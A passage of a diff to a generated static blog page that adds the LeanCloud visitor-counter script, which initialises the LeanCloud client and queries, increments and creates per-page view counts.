AV.ACL;o.setPublicReadAccess(!0),o.setPublicWriteAccess(!0),n.setACL(o),n.set("title",r),n.set("url",s),n.set("time",1),n.save(null,{success:function(e){$(document.getElementById(s)).find(".leancloud-visitors-count").text(e.get("time"))},error:function(e,t){console.log("Failed to create")}})}},error:function(e){console.log("Error:"+e.code+" "+e.message)}})}$(function(){var e=AV.Object.extend("Counter");1==$(".leancloud_visitors").length?addCount(e):1<$(".post-title-link").length&&showTime(e)})</script></body></html>
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("tEohukLOYSlckiF5bzuc4FQU-gzGzoHsz", "JT5TeK0bdQjQsU4FAh8aHs12");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            
+            counter.save(null, {
+              success: function(counter) {
+                
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(counter.get('time'));
+                
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            
+              var newcounter = new Counter();
+              /* Set ACL */
+              var acl = new AV.ACL();
+              acl.setPublicReadAccess(true);
+              acl.setPublicWriteAccess(true);
+              newcounter.setACL(acl);
+              /* End Set ACL */
+              newcounter.set("title", title);
+              newcounter.set("url", url);
+              newcounter.set("time", 1);
+              newcounter.save(null, {
+                success: function(newcounter) {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+                },
+                error: function(newcounter, error) {
+                  console.log('Failed to create');
+                }
+              });
+            
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
